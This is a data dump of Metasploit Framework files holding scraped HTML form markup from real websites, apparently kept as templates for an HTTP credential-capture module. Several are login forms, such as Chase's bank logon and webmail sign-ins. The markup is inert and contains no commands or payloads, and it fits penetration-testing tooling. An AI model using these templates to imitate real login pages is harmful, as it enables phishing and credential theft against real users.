{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/biglobe.ne.jp.txt", "content": "<form name='srch' action='http://cgi.search.biglobe.ne.jp/cgi-bin/search2-b' method='get' id='srch'> <input name=\"search\" type=\"hidden\" value=\"\" /><input name=\"q\" type=\"text\" value=\"\" /><input name=\"bt01\" type=\"image\" src=\"\" alt=\"\u0152\u0178\u008d\u00f5\" /></form><form action='https://my.sso.biglobe.ne.jp/jump/index_t.html' method='get' target='_blank'> <input class=\"btn\" type=\"submit\" value=\"\" /></form><form name='direct' action='https://webrymail.sso.biglobe.ne.jp/cgi-bin/wms-btop.cgi?f=dl' method='post' id='direct'> <input name=\"mode\" type=\"hidden\" value=\"\" /><input name=\"loginAddress\" type=\"text\" value=\"\" onfocus=\"onFocusWebmail()\" /><input name=\"but\" type=\"checkbox\" id=\"mailsave\" value=\"\" /><input name=\"password\" class=\"ml4-1\" type=\"password\" /><input class=\"ml4-2\" type=\"button\" value=\"\" onclick=\"openWebmail();\" /></form><form name='setting_weather' action='/' id='setting_weather' method='get'> <input name=\"weather\" type=\"radio\" id=\"city01\" value=\"\" /><input name=\"weather\" type=\"radio\" id=\"city02\" value=\"\" /><input name=\"weather\" type=\"radio\" id=\"city03\" value=\"\" /><input name=\"weather\" type=\"radio\" id=\"city04\" value=\"\" /><input name=\"weather\" type=\"radio\" id=\"city05\" value=\"\" /><input name=\"weather\" type=\"radio\" id=\"city06\" value=\"\" /><input name=\"weather\" type=\"radio\" id=\"city07\" value=\"\" /><input name=\"weather\" type=\"radio\" id=\"city08\" value=\"\" /><input name=\"weather\" type=\"radio\" id=\"city09\" value=\"\" /><input name=\"weather\" type=\"radio\" id=\"city10\" value=\"\" /><input name=\"weather\" type=\"radio\" id=\"city11\" value=\"\" /><input name=\"weather\" type=\"radio\" id=\"city12\" value=\"\" /><input name=\"weather\" type=\"radio\" id=\"city13\" value=\"\" /><input name=\"weather\" type=\"radio\" id=\"city14\" value=\"\" /><input name=\"weather\" type=\"radio\" id=\"city15\" value=\"\" /><input name=\"weather\" type=\"radio\" id=\"city16\" value=\"\" /><input name=\"weather\" type=\"radio\" id=\"city17\" value=\"\" /><input name=\"weather\" type=\"radio\" id=\"city18\" value=\"\" /><input name=\"weather\" type=\"radio\" id=\"city19\" value=\"\" /><input name=\"weather\" type=\"radio\" id=\"city20\" value=\"\" /><input name=\"weather\" type=\"radio\" id=\"city21\" value=\"\" /><input name=\"weather\" type=\"radio\" id=\"city22\" value=\"\" /><input name=\"weather\" type=\"radio\" id=\"city23\" value=\"\" /><input name=\"weather\" type=\"radio\" id=\"city24\" value=\"\" /><input name=\"weather\" type=\"radio\" id=\"city25\" value=\"\" /><input name=\"weather\" type=\"radio\" id=\"city26\" value=\"\" /><input name=\"weather\" type=\"radio\" id=\"city27\" value=\"\" /><input name=\"weather\" type=\"radio\" id=\"city28\" value=\"\" /><input name=\"weather\" type=\"radio\" id=\"city29\" value=\"\" /><input name=\"weather\" type=\"radio\" id=\"city30\" value=\"\" /><input name=\"weather\" type=\"radio\" id=\"city31\" value=\"\" /><input name=\"weather\" type=\"radio\" id=\"city32\" value=\"\" /><input name=\"weather\" type=\"radio\" id=\"city33\" value=\"\" /><input name=\"weather\" type=\"radio\" id=\"city34\" value=\"\" /><input name=\"weather\" type=\"radio\" id=\"city35\" value=\"\" /><input name=\"weather\" type=\"radio\" id=\"city36\" value=\"\" /><input name=\"weather\" type=\"radio\" id=\"city37\" value=\"\" /><input name=\"weather\" type=\"radio\" id=\"city38\" value=\"\" /><input name=\"weather\" type=\"radio\" id=\"city39\" value=\"\" /><input name=\"weather\" type=\"radio\" id=\"city40\" value=\"\" /><input name=\"weather\" type=\"radio\" id=\"city41\" value=\"\" /><input name=\"weather\" type=\"radio\" id=\"city42\" value=\"\" /><input name=\"weather\" type=\"radio\" id=\"city43\" value=\"\" /><input name=\"weather\" type=\"radio\" id=\"city44\" value=\"\" /><input name=\"weather\" type=\"radio\" id=\"city45\" value=\"\" /><input name=\"weather\" type=\"radio\" id=\"city46\" value=\"\" /><input name=\"weather\" type=\"radio\" id=\"city47\" value=\"\" /><input type=\"submit\" value=\"\" /><input type=\"reset\" value=\"\" /></form><form name='setting_horoscope' action='/' id='setting_horoscope' method='get'> <input name=\"horoscope\" type=\"radio\" id=\"sign00\" value=\"\" /><input name=\"horoscope\" type=\"radio\" id=\"sign01\" value=\"\" /><input name=\"horoscope\" type=\"radio\" id=\"sign02\" value=\"\" /><input name=\"horoscope\" type=\"radio\" id=\"sign03\" value=\"\" /><input name=\"horoscope\" type=\"radio\" id=\"sign04\" value=\"\" /><input name=\"horoscope\" type=\"radio\" id=\"sign05\" value=\"\" /><input name=\"horoscope\" type=\"radio\" id=\"sign06\" value=\"\" /><input name=\"horoscope\" type=\"radio\" id=\"sign07\" value=\"\" /><input name=\"horoscope\" type=\"radio\" id=\"sign08\" value=\"\" /><input name=\"horoscope\" type=\"radio\" id=\"sign09\" value=\"\" /><input name=\"horoscope\" type=\"radio\" id=\"sign10\" value=\"\" /><input name=\"horoscope\" type=\"radio\" id=\"sign11\" value=\"\" /><input type=\"submit\" value=\"\" /><input type=\"reset\" value=\"\" /></form><form name='setting_traffic' action='/' id='setting_traffic' method='get'> <input name=\"traarea\" type=\"radio\" id=\"area01\" value=\"\" /><input name=\"traarea\" type=\"radio\" id=\"area02\" value=\"\" /><input name=\"traarea\" type=\"radio\" id=\"area03\" value=\"\" /><input name=\"traarea\" type=\"radio\" id=\"area04\" value=\"\" /><input name=\"traarea\" type=\"radio\" id=\"area05\" value=\"\" /><input name=\"traarea\" type=\"radio\" id=\"area06\" value=\"\" /><input name=\"traarea\" type=\"radio\" id=\"area07\" value=\"\" /><input name=\"traarea\" type=\"radio\" id=\"area08\" value=\"\" /><input type=\"submit\" value=\"\" /><input type=\"reset\" value=\"\" /></form><form name='setting_tv' action='/' id='setting_tv' method='get'> <input name=\"tv\" type=\"radio\" id=\"pref00\" value=\"\" /><input name=\"tv\" type=\"radio\" id=\"pref01\" value=\"\" /><input name=\"tv\" type=\"radio\" id=\"pref02\" value=\"\" /><input name=\"tv\" type=\"radio\" id=\"pref03\" value=\"\" /><input name=\"tv\" type=\"radio\" id=\"pref04\" value=\"\" /><input name=\"tv\" type=\"radio\" id=\"pref05\" value=\"\" /><input name=\"tv\" type=\"radio\" id=\"pref06\" value=\"\" /><input name=\"tv\" type=\"radio\" id=\"pref07\" value=\"\" /><input name=\"tv\" type=\"radio\" id=\"pref08\" value=\"\" /><input name=\"tv\" type=\"radio\" id=\"pref09\" value=\"\" /><input name=\"tv\" type=\"radio\" id=\"pref10\" value=\"\" /><input name=\"tv\" type=\"radio\" id=\"pref11\" value=\"\" /><input name=\"tv\" type=\"radio\" id=\"pref12\" value=\"\" /><input name=\"tv\" type=\"radio\" id=\"pref13\" value=\"\" /><input name=\"tv\" type=\"radio\" id=\"pref14\" value=\"\" /><input name=\"tv\" type=\"radio\" id=\"pref15\" value=\"\" /><input name=\"tv\" type=\"radio\" id=\"pref16\" value=\"\" /><input name=\"tv\" type=\"radio\" id=\"pref17\" value=\"\" /><input name=\"tv\" type=\"radio\" id=\"pref18\" value=\"\" /><input name=\"tv\" type=\"radio\" id=\"pref19\" value=\"\" /><input name=\"tv\" type=\"radio\" id=\"pref20\" value=\"\" /><input name=\"tv\" type=\"radio\" id=\"pref21\" value=\"\" /><input name=\"tv\" type=\"radio\" id=\"pref22\" value=\"\" /><input name=\"tv\" type=\"radio\" id=\"pref23\" value=\"\" /><input name=\"tv\" type=\"radio\" id=\"pref24\" value=\"\" /><input name=\"tv\" type=\"radio\" id=\"pref25\" value=\"\" /><input name=\"tv\" type=\"radio\" id=\"pref26\" value=\"\" /><input name=\"tv\" type=\"radio\" id=\"pref27\" value=\"\" /><input name=\"tv\" type=\"radio\" id=\"pref28\" value=\"\" /><input name=\"tv\" type=\"radio\" id=\"pref29\" value=\"\" /><input name=\"tv\" type=\"radio\" id=\"pref30\" value=\"\" /><input name=\"tv\" type=\"radio\" id=\"pref31\" value=\"\" /><input name=\"tv\" type=\"radio\" id=\"pref32\" value=\"\" /><input name=\"tv\" type=\"radio\" id=\"pref33\" value=\"\" /><input name=\"tv\" type=\"radio\" id=\"pref34\" value=\"\" /><input name=\"tv\" type=\"radio\" id=\"pref35\" value=\"\" /><input name=\"tv\" type=\"radio\" id=\"pref36\" value=\"\" /><input name=\"tv\" type=\"radio\" id=\"pref37\" value=\"\" /><input name=\"tv\" type=\"radio\" id=\"pref38\" value=\"\" /><input name=\"tv\" type=\"radio\" id=\"pref39\" value=\"\" /><input name=\"tv\" type=\"radio\" id=\"pref40\" value=\"\" /><input name=\"tv\" type=\"radio\" id=\"pref41\" value=\"\" /><input name=\"tv\" type=\"radio\" id=\"pref42\" value=\"\" /><input name=\"tv\" type=\"radio\" id=\"pref43\" value=\"\" /><input name=\"tv\" type=\"radio\" id=\"pref44\" value=\"\" /><input name=\"tv\" type=\"radio\" id=\"pref45\" value=\"\" /><input name=\"tv\" type=\"radio\" id=\"pref46\" value=\"\" /><input type=\"submit\" value=\"\" /><input type=\"reset\" value=\"\" /></form><form name='srch2' action='http://cgi.search.biglobe.ne.jp/cgi-bin/search2-b' method='get' id='srch2'> <input name=\"search\" type=\"hidden\" value=\"\" /><input name=\"q\" type=\"text\" /><input name=\"bt01\" type=\"image\" src=\"\" alt=\"\u0152\u0178\u008d\u00f5\" /></form>", "timestamp": "2025-10-24T23:39:56.991392"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/bild.de.txt", "content": "<form name='cmsWebSearchForm' action='/kddb/cms/websearch.do' method='get' id='searchForm'> <input name=\"site\" type=\"hidden\" id=\"whichSearch\" value=\"\" /><input name=\"query\" type=\"text\" id=\"inputField\" value=\"\" onfocus=\"this.value=''\" /><input name=\"searchButton\" type=\"image\" src=\"/BTO/System2007/Bilder/Suche/button__finden.gif\" id=\"searchGo\" alt=\"Finden\" /></form><form action='javascript:popupuebergabe();' method='post'> <input class=\"inputField\" type=\"text\" id=\"kuenstlerfeld\" value=\"\" onfocus=\"if (this.value == 'Ihren K&uuml;nstler eingeben') {this.value = '';}\" onblur=\"if (this.value == '') {this.value = 'Ihren K&uuml;nstler eingeben';}\" /><input class=\"btnPlay\" type=\"image\" src=\"/BILD/entertainment/musik/bild-radio/player/gfx/play__01.gif\" onmouseover=\"this.src='/BILD/entertainment/musik/bild-radio/player/gfx/play__02.gif'\" onmouseout=\"this.src='/BILD/entertainment/musik/bild-radio/player/gfx/play__01.gif'\" /></form><form name='searchForm' action='http://shop.bild.de/search.do' method='get'> <input name=\"userQuery\" type=\"hidden\" value=\"\" /><input name=\"searchText\" type=\"text\" value=\"\" onfocus=\"if (this.value == 'Produktsuche') this.value =''\" onblur=\"if (this.value == '') this.value = 'Produktsuche'\" style=\"border: 1px solid #888888; color: #888888; font: bold 10px arial, sans-serif; height: 14px; h\\eight: 14px; line-height: 14px; text-align: left; width: 105px; padding-left: .5em;\" /><input type=\"image\" src=\"/BILD/shopping/shoptipps/__images/find.gif\" alt=\"Los\" align=\"middle\" /></form><form name='tvprogform' action='javascript: tvprogGO();' id='tvprogform' method='get'> <input class=\"btnTVProg\" type=\"image\" src=\"/BILD/System/gfx/buttons/button__finden.gif\" onmouseover=\"this.src='/BILD/System/gfx/buttons/button__finden__hover.gif'\" onmouseout=\"this.src='/BILD/System/gfx/buttons/button__finden.gif'\" /></form><form name='immoform306' action='' onsubmit='javascript:Go306(document.immoform306.immo306.options[document.immoform306.immo306.options.selectedIndex].value, &street=&hnr=&zip=+escape(document.immoform306.city306.value)+&radius=0);'> <input name=\"city306\" class=\"inputField\" type=\"text\" value=\"\" onfocus=\"this.value=''\" /></form>", "timestamp": "2025-10-24T23:39:57.320657"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/blogfa.com.txt", "content": "<form action='Desktop/Login.aspx' method='post'> <input name=\"username\" size=\"19\" autocomplete=\"on\" class=\"Textbox\" dir=\"ltr\" type=\"text\" maxlength=\"41\" /><input name=\"password\" size=\"19\" class=\"Textbox\" dir=\"ltr\" type=\"password\" maxlength=\"20\" /><input name=\"btnSubmit\" class=\"oBtn\" type=\"submit\" value=\"\" style=\"WIDTH: 98px\" /></form>", "timestamp": "2025-10-24T23:39:57.643855"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/bramjnet.com.txt", "content": "<form action='http://groups.yahoo.com/subscribe/love_q8' method='get'> <input name=\"user\" size=\"20\" type=\"text\" value=\"\" style=\"text-align: center; width: 110; height: 20; font-size: 8pt; font-weight: bold\" /><input name=\"Click here to join love_q8\" type=\"image\" src=\"\" border=\"0\" alt=\"Click here to join love_q8\" /></form><form action='modules.php?name=Surveys' method='post'> <input name=\"pollID\" type=\"hidden\" value=\"\" /><input name=\"forwarder\" type=\"hidden\" value=\"\" /><input name=\"voteID\" type=\"radio\" value=\"\" /><input name=\"voteID\" type=\"radio\" value=\"\" /><input name=\"voteID\" type=\"radio\" value=\"\" /><input name=\"voteID\" type=\"radio\" value=\"\" /><input name=\"voteID\" type=\"radio\" value=\"\" /><input name=\"voteID\" type=\"radio\" value=\"\" /><input type=\"submit\" value=\"\" /></form><form action='http://groups.google.com.sa/group/bramjnet/boxsubscribe'> <input name=\"email\" size=\"17\" type=\"text\" value=\"\" style=\"border-style: dotted; border-width: 1\" /><input name=\"sub\" type=\"submit\" value=\"\" style=\"width: 55; height: 20\" /></form><form action='modules.php?name=Qamoos' method='POST'> <input name=\"word\" type=\"text\" value=\"\" /></form><form action='http://translate.google.com/translate' target='_blank'> <input name=\"langpair\" checked type=\"radio\" value=\"\" /></form><form action='http://www.google.com/custom' method='get' target='_top'> <input name=\"domains\" type=\"hidden\" value=\"\" /><input name=\"q\" size=\"25\" type=\"text\" id=\"sbi\" value=\"\" maxlength=\"255\" /><input name=\"sa\" dir=\"rtl\" type=\"submit\" id=\"sbb\" value=\"\" /><input name=\"sitesearch\" checked type=\"radio\" id=\"ss0\" value=\"\" /><input name=\"sitesearch\" type=\"radio\" id=\"ss1\" value=\"\" /><input name=\"sitesearch\" type=\"radio\" id=\"ss2\" value=\"\" /><input name=\"sitesearch\" type=\"radio\" id=\"ss3\" value=\"\" /><input name=\"client\" type=\"hidden\" value=\"\" /><input name=\"forid\" type=\"hidden\" value=\"\" /><input name=\"channel\" type=\"hidden\" value=\"\" /><input name=\"ie\" type=\"hidden\" value=\"\" /><input name=\"oe\" type=\"hidden\" value=\"\" /><input name=\"cof\" type=\"hidden\" value=\"\" /><input name=\"hl\" type=\"hidden\" value=\"\" /></form><form action='modules.php?name=News' method='post'> </form>", "timestamp": "2025-10-24T23:39:57.973157"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/break.com.txt", "content": "<form action='http://my.break.com/Content/Search/Search.aspx' method='get' onsubmit='return validateSearch();' style='margin:0;padding:0;'> <input name=\"SEARCH1\" class=\"new_button\" type=\"submit\" value=\"\" /><input name=\"s\" class=\"new_search\" type=\"text\" id=\"SearchTextbox1\" onfocus=\"ActivateSilverLight()\" maxlength=\"64\" /><input name=\"SearchType\" type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:39:58.335732"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/btjunkie.org.txt", "content": "<form name='form_search_basic' action='/search' method='GET' onsubmit='return validate(search_basic)'> <input name=\"q\" size=\"23\" class=\"input1\" type=\"text\" value=\"\" style=\"height: 18px;font-size:14px;\" /><input name=\"f\" type=\"checkbox\" value=\"\" /><input type=\"submit\" value=\"\" style=\"font-weight: bold;\" /></form><form name='form_search_advance' action='/search' method='GET' onsubmit=' return validate(search_advance)'> <input name=\"q\" size=\"23\" class=\"input1\" type=\"text\" value=\"\" style=\"height: 18px;font-size:14px;\" /><input type=\"submit\" value=\"\" style=\"font-size: 12px;\" /><input name=\"f\" type=\"checkbox\" value=\"\" /><input name=\"s\" type=\"checkbox\" value=\"\" /><input name=\"m\" type=\"checkbox\" value=\"\" /></form><form name='form_browse' action='/browse' method='GET' onsubmit='return validate(browse)'> <input name=\"s\" checked type=\"checkbox\" value=\"\" onclick=\"validate('browse'); document.form_browse.submit();\" /></form><form action='/' method='POST'> <input name=\"ho_onnum\" type=\"hidden\" value=\"\" /></form><form action='/' method='POST'> <input name=\"ho_onnum\" type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:39:58.689720"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/buzznet.com.txt", "content": "<form name='searchWithDropDown' action='http://www.buzznet.com/www/search/photos/' id='searchWithDropDown' method='get'> <input name=\"stype\" type=\"hidden\" id=\"topNavSearchType\" value=\"\" /><input name=\"q\" autocomplete=\"off\" type=\"text\" id=\"topNavSearch\" onkeyup=\"suggestTag(event, this, 2, 10, true);\" value=\"\" onfocus=\"if(this.value == 'SEARCH') this.value = '';\" maxlength=\"255\" /><input class=\"topNavSearchBtn\" type=\"submit\" value=\"\" /></form><form name='main_login' action='/user/login/' id='main_login' method='post' onsubmit='homeSignIn();return false;'> <input name=\"gohome\" type=\"hidden\" id=\"gohome\" value=\"\" /><input name=\"username\" type=\"text\" id=\"main_username\" value=\"\" onclick=\"if(!this.focused){this.value='';this.focused=1;}\" /><input name=\"password\" type=\"password\" id=\"main_password\" /><input type=\"submit\" id=\"homeSignInButton\" value=\"\" /></form>", "timestamp": "2025-10-24T23:39:59.019143"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/care.com.txt", "content": "<form name='searchBarForm' action='/visitor/captureSearchBar.do;jsessionid=A644C2AF6179D8AE03881B36EFAB0792.app3' method='post' onsubmit='JavaScript:eraseCookie(refineSearchBuckets);return validateZIP(this.zipCode.value)'> <input name=\"searchPerformed\" type=\"hidden\" value=\"\" /><input name=\"zipCode\" size=\"5\" type=\"text\" value=\"\" maxlength=\"5\" style=\"width:60px; font-size: 12px;\" /><input name=\"milesFromZipCode\" type=\"hidden\" value=\"\" style=\"display:none;\" /><input name=\"\" type=\"image\" src=\"\" alt=\"Search Now\" style=\"margin:20px 0 0 35px;\" /></form>", "timestamp": "2025-10-24T23:39:59.356214"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/careerbuilder.com.txt", "content": "<form action='/Jobseeker/Jobs/JobResults.aspx' id='mxfSearch' method='Get'> <input name=\"IPath\" type=\"hidden\" value=\"\" /><input name=\"ch\" type=\"hidden\" value=\"\" /><input name=\"rs\" type=\"hidden\" value=\"\" /><input name=\"s_rawwords\" tabindex=\"1\" class=\"input_field_keywords\" type=\"text\" id=\"s_rawwords\" /><input name=\"s_freeloc\" tabindex=\"2\" class=\"input_field_location\" type=\"text\" id=\"s_freeloc\" /><input name=\"s_emptype\" tabindex=\"4\" option type=\"checkbox\" value=\"\" /><input name=\"s_emptype\" tabindex=\"5\" option type=\"checkbox\" value=\"\" /><input name=\"s_emptype\" tabindex=\"6\" option type=\"checkbox\" value=\"\" /><input name=\"s_emptype\" tabindex=\"7\" option type=\"checkbox\" value=\"\" /><input type=\"hidden\" id=\"hdnSearchType\" value=\"\" /><input name=\"qsbButton\" tabindex=\"10\" class=\"btn\" type=\"submit\" id=\"qsbButton\" value=\"\" onclick=\"searchSubmitted();return true;\" /><input name=\"cbsid\" type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:39:59.690219"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/chase.com.txt", "content": "<form name='microsite_site_search_form' onsubmit='javascript:return doSearch(document. microsite_site_search_form.QueryText.value)'> <input name=\"QueryText\" size=\"10\" class=\"inputTextBox\" title=\"Enter keyword to search\" id=\"searchfield\" /></form><form name='logonform' autocomplete='off' action='https://chaseonline.chase.com/siteminderagent/forms/formpost.fcc' id='logonform' method='POST' onsubmit='return validateandsetcookie(document.logonform.usr_name, document.logonform.usr_password.value, document.logonform.remember.checked, .chase.com,RBGLogon)' align='center' style='display: inline; margin: 0; padding: 0;'> <input name=\"authmethod\" type=\"hidden\" value=\"\" /><input name=\"locale\" type=\"hidden\" value=\"\" /><input name=\"pagegentime\" type=\"hidden\" value=\"\" /><input name=\"LOB\" type=\"hidden\" value=\"\" /><input name=\"hiddenuri\" type=\"hidden\" value=\"\" /><input name=\"usr_name\" tabindex=\"1\" size=\"15\" class=\"pwdTextBox\" id=\"usr_name\" maxlength=\"32\" /><input name=\"usr_password\" tabindex=\"2\" size=\"15\" class=\"pwdTextBox\" type=\"password\" id=\"usr_password\" maxlength=\"32\" /><input tabindex=\"4\" class=\"logonCheckbox\" type=\"checkbox\" id=\"remember\" /><input tabindex=\"3\" type=\"image\" src=\"/ccpmweb/generic/image/logon_button_home.gif\" vspace=\"0\" border=\"0\" height=\"16\" alt=\"log on\" width=\"57\" /></form>", "timestamp": "2025-10-24T23:40:00.038953"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/china.com.txt", "content": "<form name='maillogin' method='post' id='maillogin' onsubmit='return validmail();'> <input name=\"verifycookie\" type=\"hidden\" /><input name=\"user\" type=\"hidden\" /><input name=\"pass\" type=\"hidden\" /><input name=\"usrid\" type=\"hidden\" value=\"\" /><input name=\"usrpwd\" type=\"hidden\" value=\"\" /><input name=\"chinahome\" type=\"hidden\" value=\"\" /><input name=\"language\" size=\"8\" type=\"hidden\" value=\"\" /><input name=\"username\" type=\"hidden\" value=\"\" /><input name=\"login\" type=\"hidden\" /><input name=\"password\" type=\"hidden\" /><input name=\"mail_language\" type=\"hidden\" value=\"\" /><input name=\"show_frame\" type=\"hidden\" value=\"\" /><input name=\"cryptpasswd\" type=\"hidden\" value=\"\" /><input name=\"LoginName\" size=\"8\" class=\"input\" id=\"mailNAME\" /><input name=\"passwd\" size=\"6\" class=\"input\" type=\"password\" id=\"mailPWD\" /><input name=\"Submit\" type=\"submit\" value=\"\" /></form><form name='form1' action='http://zwds.villa.china.com/happy/rsqx_ri/jisuan.asp' method='POST' target='_blank'> <input name=\"ri_jisuan\" type=\"hidden\" value=\"\" /><input name=\"name_tmp\" size=\"6\" class=\"inpt\" type=\"text\" value=\"\" /><input name=\"\" type=\"image\" src=\"/zh_cn/img0801/bg_fortuneBtn2.gif\" /></form>", "timestamp": "2025-10-24T23:40:00.389909"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/chinaren.com.txt", "content": "<form action='http://search.chinaren.com/alusearch/cm_search.jsp' id='searchFM' method='post' target='_blank'> <input name=\"keyword\" class=\"sinput\" type=\"text\" id=\"searchKEY\" value=\"\" onfocus=\"javascript:{this.value='';}\" /><input type=\"image\" src=\"\" align=\"middle\" /></form><form action='http://xiaonei.chinaren.com/other/vote.jsp' method='post' onsubmit='WinOpen(\"\")' target='win_poll'> <input name=\"voteid\" type=\"hidden\" value=\"\" /><input name=\"ql80_1\" type=\"hidden\" value=\"\" /><input name=\"q80_1\" type=\"radio\" value=\"\" /><input name=\"q80_1\" type=\"radio\" value=\"\" /><input name=\"q80_1\" type=\"radio\" value=\"\" /><input name=\"q80_1\" type=\"radio\" value=\"\" /><input type=\"image\" src=\"\" height=\"23\" width=\"44\" /></form>", "timestamp": "2025-10-24T23:40:00.725579"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/clicksor.com.txt", "content": "<form name='login' method='post'> <input name=\"username\" class=\"login_field\" onkeydown=\"if (event.keyCode==13) radioFormHandler(document.login,'checklogin.php','login');\" type=\"text\" id=\"username\" /><input name=\"password\" class=\"login_field\" onkeydown=\"if (event.keyCode==13) radioFormHandler(document.login,'checklogin.php','login');\" type=\"password\" id=\"password\" /></form>", "timestamp": "2025-10-24T23:40:01.054821"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/cnet.com.txt", "content": "<form name='uloginForm' action='/1324-4_1-103.html?tag=unilogin' id='uloginForm' method='post' style='display: none;'> <input name=\"EMAILADDR\" class=\"mtx_unilog_txtbox1\" type=\"text\" value=\"\" onfocus=\"javascript:this.value=''\" /><input name=\"PASSWORD\" size=\"15\" class=\"mtx_unilog_txtbox2\" type=\"password\" id=\"uloginPass\" value=\"\" onfocus=\"javascript:this.value=''\" maxlength=\"20\" /><input class=\"autoMouseOver\" type=\"image\" src=\"\" border=\"0\" value=\"\" height=\"20\" alt=\"Go\" onclick=\"this.form.submit()\" width=\"32\" /><input name=\"REMEMBERME\" checked=\"checked\" type=\"checkbox\" value=\"\" /></form><form name='tsearch' action='http://www.search.com/redirect' method='get' id='rb_srch'> <input name=\"query\" size=\"20\" class=\"rb_srch_box\" onkeypress=\"return trapSearchKey(event, 13, function(){sendSearchHelper('http://www.search.com/redirect','rb_srch','rb_srch_target')});\" type=\"text\" maxlength=\"255\" /><input name=\"tag\" type=\"hidden\" value=\"\" /><input name=\"submit\" class=\"rb_srch_go\" type=\"image\" src=\"\" /></form><form name='fsearch' class='rb_pft_form' action='http://www.search.com/redirect' method='get' id='rb_srch_ftr'> <input name=\"query\" size=\"12\" class=\"rb_bsrch_box\" onkeypress=\"return trapSearchKey(event, 13, function(){sendSearchHelper('http://www.search.com/redirect','rb_srch_ftr','rb_srch_ftr_target')});\" type=\"text\" maxlength=\"255\" /><input name=\"tag\" type=\"hidden\" value=\"\" /><input name=\"submit\" class=\"rb_bsrch_go\" type=\"image\" src=\"\" alt=\"Go\" /></form><form class='rb_ft_srch'> </form>", "timestamp": "2025-10-24T23:40:01.390090"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/cnn.com.txt", "content": "<form action='http://search.cnn.com/cnn/search' method='get' onsubmit='return cnnSearch(this);'> <input name=\"cnnHeadSrchType\" type=\"hidden\" id=\"cnnHeadSrchType\" value=\"\" /><input class=\"cnnHeaderTxtField\" type=\"text\" id=\"cnnHeadSrchTxt\" maxlength=\"40\" /><input class=\"cnnHeaderSearchBtn\" type=\"image\" src=\"\" alt=\"Submit\" /></form><form class='cnnHidden'> </form><form name='localAllLookupForm' onsubmit='checkInput(all,this.inputField.value);return false;'> <input name=\"inputField\" class=\"cnnGetLocalBoxInput\" type=\"text\" id=\"cnnGetLocalInput\" value=\"\" onfocus=\"cnnUpdateTxtElem(this,'Enter a U.S./Intl city or ZIP code');\" onblur=\"cnnUpdateTxtElem(this,'Enter a U.S./Intl city or ZIP code');\" /></form><form name='localWeatherForm' onsubmit='checkInput(weather,this.inputField.value);return false;'> <input name=\"inputField\" size=\"31\" class=\"cnnGetLocalBoxInput\" type=\"text\" id=\"cnnCustomWeatherInput\" value=\"\" onfocus=\"cnnUpdateTxtElem(this,'Enter a U.S./Intl city or ZIP code');\" onblur=\"cnnUpdateTxtElem(this,'Enter a U.S./Intl city or ZIP code');\" /></form><form name='localNewsForm' onsubmit='checkInput(news,this.inputField.value);return false;'> <input name=\"inputField\" class=\"cnnGetLocalBoxInput\" type=\"text\" id=\"cnnCustomNewsInput\" value=\"\" onfocus=\"cnnUpdateTxtElem(this,'Enter a U.S./Intl city or ZIP code');\" onblur=\"cnnUpdateTxtElem(this,'Enter a U.S./Intl city or ZIP code');\" /></form><form class='cnnHidden'> </form><form action='http://cgi.money.cnn.com/servlets/quote_redirect' method='post'> <input name=\"query\" class=\"cnnTxtMBGetQuote\" type=\"text\" value=\"\" onfocus=\"cnnMbChangeTxtClass(this);\" onblur=\"cnnMbCheckTxtClass(this);\" /><input type=\"image\" src=\"\" border=\"0\" alt=\"\" /></form><form action='http://polls.cnn.com/poll' id='qv_poll_40669' method='post' target='qv_iframe_40669'> <input name=\"poll_id\" type=\"HIDDEN\" value=\"\" /><input name=\"question_1\" type=\"radio\" id=\"cnnPollA1\" value=\"\" /><input name=\"question_1\" type=\"radio\" id=\"cnnPollA2\" value=\"\" /></form><form action='http://search.cnn.com/cnn/search' method='get' onsubmit='return cnnFootSearch(this);'> <input class=\"cnnGFooterSearchField\" type=\"text\" id=\"cnnFootSrchTxt\" /><input class=\"cnnGFooterSearchBtn\" type=\"image\" src=\"\" border=\"0\" alt=\"Submit\" /></form>", "timestamp": "2025-10-24T23:40:01.761259"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/cocolog-nifty.com.txt", "content": "<form action='http://search.nifty.com/blogsearch/search' method='GET' style='margin:0px;'> <input name=\"cflg\" type=\"hidden\" value=\"\" /><input name=\"q\" size=\"55\" class=\"sform\" type=\"TEXT\" value=\"\" style=\"width:350px\" /><input name=\"submit\" type=\"submit\" value=\"\" /><input name=\"type\" checked type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:02.108817"}
